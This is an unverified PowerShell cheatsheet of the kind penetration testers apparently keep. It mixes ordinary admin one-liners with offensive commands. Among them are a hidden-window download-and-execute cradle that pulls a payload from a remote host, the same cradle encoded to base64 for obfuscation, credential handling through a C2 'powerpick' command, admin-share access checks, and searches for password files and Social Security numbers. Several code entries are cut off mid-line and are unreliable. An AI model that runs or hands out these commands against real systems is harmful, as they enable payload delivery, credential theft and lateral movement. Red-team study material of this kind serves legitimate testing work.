---
id: 0078609d-df45-45ee-bcff-bb7747fcf2f9
name: Powershell Cheatsheet
type: cheatsheet
verified: false
created_at: '2020-07-14T18:21:12.034927+00:00'
updated_at: '2023-05-29T16:48:52.690130+00:00'
---

# Powershell Cheatsheet

List help for cmdlet: `Get-Help [cmdlet] -full`

List available properties and methods: `Get-Member`

For-each loop: `ForEach-Object { $_ }`

Search for string (like grep): `Select-String -path [file] -pattern [string]`

**Code**: [[
$file=(gi c:\file.exe);
$date='01/03/2009 12:12 p]]

**Command** ([[Show last system boot time]]):

```bash
Get-WmiObject win32_operatingsystem | select csname, @{LABEL='LastBootUpTime'; EXPRESSION={$_.ConverttoDateTime($_.lastbootuptime)}}

```

**Code**: [[
powershell foreach ($target in (get-content c:\us]]

**Code**: [[
[System.Net.ServicePointManager]::ServerCertifica]]

**Command** ([[Encode string]]):

```bash
echo "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')" | iconv --to-code UTF-16LE | base64 -w 0

```

**Command** ([[List recently modified files in path (U:)]]):

```bash
Get-Childitem u:\ -Recurse | where-object {!($_.psiscontainer)} | where { $_.LastWriteTime -gt $(Get-Date).AddDays(-1) } | foreach {"$($_.LastWriteTime) :: $($_.Fullname) " }

```

**Command** ([[List Files]]):

```bash
Select-String -Path c:\fso\*.txt, c:\fso\*.log -pattern ed

```

**Command** ([[List First 100 Files]]):

```bash
Get-ChildItem -Path XXX |Select -First 100 Fullname

```

**Command** ([[List a Process’s Loaded Modules (DLL)]]):

```bash
get-process -id 1234|select -expand modules

```

**Code**: [[
https://enigma0x3.net/2017/01/05/lateral-movement]]

**Command** ([[Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C$,ADMIN$)]]):

```bash
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ |Select LocalAccountTokenFilterPolicy |fl

```

**Command** ([[Test User Credentials]]):

```bash
powerpick $password = ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential ("domain\name", $password);

```

**Code**: [[
$SSN_Regex = " [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}]]

**Code**: [[
Get-ItemProperty -Path Registry::"HKLM\SOFTWARE\P]]

**Command** ([[Find-Files (custom)]]):

```bash
Find-Files -searchBase "i:\" -searchTerms "*web.xml*,*web.config*,*password*,*tomcat-users.xml*" -LogPath "C:\Users\username\AppData\Local\Temp"

```

**Command** ([[Run Local and Domain enumeration functions on the local host.]]):

```bash
Get-Enumeration -Path . -Local -Domain

```

**Command** ([[Download and execute IEX]]):

```powershell
powershell -nop -w hidden -c "iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')"

```

**Code**: [[
powershell -window hidden -C "set-variable -name ]]

**Code**: [[
powershell -window hidden -C "set-variable -name ]]
